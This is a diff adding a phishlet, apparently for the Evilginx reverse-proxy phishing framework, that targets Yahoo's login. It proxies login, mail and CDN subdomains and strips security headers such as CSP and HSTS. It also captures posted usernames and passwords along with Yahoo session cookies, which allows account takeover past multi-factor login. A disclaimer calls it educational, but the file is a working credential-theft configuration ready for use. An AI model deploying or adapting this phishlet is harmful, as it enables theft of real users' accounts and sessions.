@@ -1,0 +1,73 @@
+# AUTHOR OF THIS PHISHLET WILL NOT BE RESPONSIBLE FOR ANY MISUSE OF THIS PHISHLET, PHISHLET IS MADE ONLY FOR TESTING/SECURITY/EDUCATIONAL PURPOSES.
+# PLEASE DO NOT MISUSE THIS PHISHLET.
+
+author: '@Acetools'
+min_ver: '2.3.0'
+
+proxy_hosts:
+  # 主登录子域
+  - {phish_sub: 'login', orig_sub: 'login', domain: 'yahoo.com', session: true, auto_filter: true, is_landing: true}
+  - {phish_sub: 'api.login', orig_sub: 'api.login', domain: 'yahoo.com', session: false, auto_filter: true, is_landing: false}
+  - {phish_sub: 'guce', orig_sub: 'guce', domain: 'yahoo.com', session: false, auto_filter: true, is_landing: false}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'yahoo.com', session: false, auto_filter: true, is_landing: false}
+  - {phish_sub: 'oidc.www', orig_sub: 'oidc.www', domain: 'yahoo.com', session: false, auto_filter: true, is_landing: false}
+  - {phish_sub: 'mail', orig_sub: 'mail', domain: 'yahoo.com', session: false, auto_filter: true, is_landing: false}
+  - {phish_sub: 'oidc.mail', orig_sub: 'oidc.mail', domain: 'yahoo.com', session: false, auto_filter: true, is_landing: false}
+  - {phish_sub: 'udc', orig_sub: 'udc', domain: 'yahoo.com', session: false, auto_filter: true, is_landing: false}
+  - {phish_sub: 'video-api.yql', orig_sub: 'video-api.yql', domain: 'yahoo.com', session: false, auto_filter: true, is_landing: false}
+  - {phish_sub: 'yep.video', orig_sub: 'yep.video', domain: 'yahoo.com', session: false, auto_filter: true, is_landing: false}
+
+  # ① 为 s.yimg.com 开启 auto_filter: true
+  - {phish_sub: 's', orig_sub: 's', domain: 'yimg.com', session: false, auto_filter: true, is_landing: false}
+
+  - {phish_sub: 's', orig_sub: 's', domain: 'yahoocdn.com', session: false, auto_filter: true, is_landing: false}
+  - {phish_sub: 'o', orig_sub: 'o', domain: 'yahoocdn.com', session: false, auto_filter: true, is_landing: false}
+  - {phish_sub: 'api-2-0', orig_sub: 'api-2-0', domain: 'spot.im', session: false, auto_filter: true, is_landing: false}
+  - {phish_sub: 'static-cdn', orig_sub: 'static-cdn', domain: 'spot.im', session: false, auto_filter: true, is_landing: false}
+  - {phish_sub: 'launcher', orig_sub: 'launcher', domain: 'spot.im', session: false, auto_filter: true, is_landing: false}
+  - {phish_sub: 'consent.cmp', orig_sub: 'consent.cmp', domain: 'oath.com', session: false, auto_filter: true, is_landing: false}
+  - {phish_sub: 'google', orig_sub: 'www', domain: 'google.com', session: true, auto_filter: false, is_landing: false}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'gstatic.com', session: true, auto_filter: true, is_landing: false}
+  - {phish_sub: 'login', orig_sub: 'login', domain: 'yahoo.net', session: false, auto_filter: false, is_landing: false}
+
+# ② 移除更多安全相关的响应头，避免 CSP / HSTS / Feature-Policy 导致资源加载失败
+response_headers_remove:
+  - 'content-security-policy'
+  - 'feature-policy'
+  - 'x-frame-options'
+  - 'strict-transport-security'
+  - 'upgrade-insecure-requests'
+
+sub_filters:
+  # 针对 login.yahoo.com 的基本替换示例
+  - {triggers_on: 'login.yahoo.com', orig_sub: 'login', domain: 'yahoo.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html','application/json','application/javascript','application/x-javascript','application/ecmascript','text/javascript','text/ecmascript']}
+  - {triggers_on: 'login.yahoo.com', orig_sub: 'login', domain: 'yahoo.com', search: 'https%3A%2F%2{hostname}/', replace: 'https%3A%2F%2{hostname}/', mimes: ['text/html','application/json','application/javascript','application/x-javascript','application/ecmascript','text/javascript','text/ecmascript']}
+  - {triggers_on: 'login.yahoo.com', orig_sub: 'login', domain: 'yahoo.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html','application/json','application/javascript','application/x-javascript','application/ecmascript','text/javascript','text/ecmascript']}
+
+  # 对 yahoo.net 的链接进行正则替换（如有需要）
+  - {triggers_on: 'login.yahoo.com', orig_sub: 'login', domain: 'yahoo.net', search: '^https:\\/\\/login\\.yahoo\\.net', replace: 'https://login.{domain}', mimes: ['text/html']}
+
+auth_tokens:
+  - domain: '.yahoo.com'
+    keys: ['OTH', 'A1S', '.*,regexp']
+  - domain: '.login.yahoo.com'
+    keys: ['T', 'Y', 'AS', '.*,regexp']
+  - domain: '.www.yahoo.com'
+    keys: ['OTHP', '.*,regexp']
+
+auth_urls:
+  - '/'
+
+credentials:
+  username:
+    key: 'username'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'
+
+login:
+  domain: 'login.yahoo.com'
+  path: '/'
